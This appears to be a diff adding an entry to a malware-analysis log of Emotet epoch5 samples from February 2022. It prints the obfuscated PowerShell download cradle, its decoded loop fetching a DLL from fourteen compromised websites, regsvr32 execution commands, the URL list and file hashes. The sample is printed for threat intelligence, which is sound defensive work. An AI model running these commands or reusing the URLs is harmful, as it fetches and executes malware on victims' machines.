@@ -2,6 +2,53 @@ Emotet 2022 | epoch5 | 23.02.2022 |
 
 ************************************************************************************************************
 
+.xls aa2a9d5cbe58d86bfeed3d1226863fd2a84f8ec286f3b8b97dbed1b005a99e89
+
+Exec >>
+
+wscript c:\programdata\etyockqw.vbs
+
+powershell.exe" -command "$ghkid=('$MJXdfshDrfGZses4=\"http:dhjdhjwebnatico.comdhjwp-contentdhjupgradedhj0MX2VOYxIDdhjbouhttp:dhjdhjwww.schoolsolutions.com.dodhjbatsdhjq48ky59LIYdhjbouhttps:dhjdhjsamanuvidhatr.comdhjwp-includesdhjjH8xq5dhjbouhttps:dhjdhjstarzfoundationtrust.orgdhjlori-tolldhj37NySdhjbouhttp:dhjdhjs39134.p938.sites.pressdns.comdhjmcoc-gltfdhjJjctz2Jdhjbouhttps:dhjdhjshrinandrajoverseas.comdhjolddhjDKrM3rb3YibtEJUVmvSdhjbouhttps:dhjdhjprodukgendeng.stormapp.indhjwp-admindhjHjfAgevd0adhjbouhttps:dhjdhjtamilyogi.onedhjwp-includesdhjo8rvflsmJJE4jdhjbouhttps:dhjdhjufbr.indhjnioh-tlendhjNln4qyUEWTKyPbSb4dhjbouhttps:dhjdhjmariemont.edu.codhjwp-admindhji8Lqtydhjbouhttps:dhjdhjpouget-malescours.frdhjwp-contentdhj1oyGiKJgrGOQEdhjbouhttp:dhjdhjxn--t60b69m1ey68a22oyvh.comdhjwp-contentdhjIe0dhjbouhttp:dhjdhjyork-show.rudhjKennedyadhjnmKdRgc70dhjbouhttps:dhjdhjmeusite023.000webhostapp.comdhjwp-admindhjYmtLrDpaiEWD4arPCnbdhj\" -sPLIt \"bou\"; foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4){$GweYH57sedswd=(\"ciuwd:iuwd\priuwdogiuwdramiuwddatiuwda\irlkhkuw.diuwdliuwdl\").rePlACe(\"iuwd\",\"\");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 32463){bReak;}}}').replace(\"dhj\",\"/\");iex $ghkid"
+
+>
+
+$mjxdfshdrfgzses4 = "http://webnatico.com/wp-content/upgrade/0MX2VOYxID/", "http://www.schoolsolutions.com.do/bats/q48ky59LIY/", "https://samanuvidhatr.com/wp-includes/jH8xq5/", "https://starzfoundationtrust.org/lori-toll/37NyS/", "http://s39134.p938.sites.pressdns.com/mcoc-gltf/Jjctz2J/", "https://shrinandrajoverseas.com/old/DKrM3rb3YibtEJUVmvS/", "https://produkgendeng.stormapp.in/wp-admin/HjfAgevd0a/", "https://tamilyogi.one/wp-includes/o8rvflsmJJE4j/", "https://ufbr.in/nioh-tlen/Nln4qyUEWTKyPbSb4/", "https://mariemont.edu.co/wp-admin/i8Lqty/", "https://pouget-malescours.fr/wp-content/1oyGiKJgrGOQE/", "http://xn--t60b69m1ey68a22oyvh.com/wp-content/Ie0/", "http://york-show.ru/Kennedya/nmKdRgc70/", "https://meusite023.000webhostapp.com/wp-admin/YmtLrDpaiEWD4arPCnb/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\irlkhkuw.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\irlkhkuw.dll") {
+    if ((get-item "c:\\programdata\\irlkhkuw.dll").length -ge 32463) {
+      break
+    }
+  }
+}
+
+
+cmd.exe /c start /B c:\windows\syswow64\regsvr32.exe /s c:\programdata\irlkhkuw.dll
+
+c:\windows\syswow64\regsvr32.exe /s c:\programdata\irlkhkuw.dll
+
+C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Wkeyqclpagz\gbymjvnwryrfz.ipy
+
+.dll
+
+http://webnatico.com/wp-content/upgrade/0MX2VOYxID/
+http://www.schoolsolutions.com.do/bats/q48ky59LIY/
+https://samanuvidhatr.com/wp-includes/jH8xq5/
+https://starzfoundationtrust.org/lori-toll/37NyS/
+http://s39134.p938.sites.pressdns.com/mcoc-gltf/Jjctz2J/
+https://shrinandrajoverseas.com/old/DKrM3rb3YibtEJUVmvS/
+https://produkgendeng.stormapp.in/wp-admin/HjfAgevd0a/
+https://tamilyogi.one/wp-includes/o8rvflsmJJE4j/
+https://ufbr.in/nioh-tlen/Nln4qyUEWTKyPbSb4/
+https://mariemont.edu.co/wp-admin/i8Lqty/
+https://pouget-malescours.fr/wp-content/1oyGiKJgrGOQE/
+http://xn--t60b69m1ey68a22oyvh.com/wp-content/Ie0/
+http://york-show.ru/Kennedya/nmKdRgc70/
+https://meusite023.000webhostapp.com/wp-admin/YmtLrDpaiEWD4arPCnb/
+
+************************************************************************************************************
+
 .zip 625DC3D13F27DF09C3E5145FD078DE8D0B3DE4FF1F5E5546B63F52B8590F5DFE
 .xls da12a3cbac2f145d75567f74aaf896fdf0c0f352116fa0c8559404391ef69121
 .dll 2ffc0c02c5da396d7805f368c101c9fbf045a809bafbe2d2e39de75f507293e6
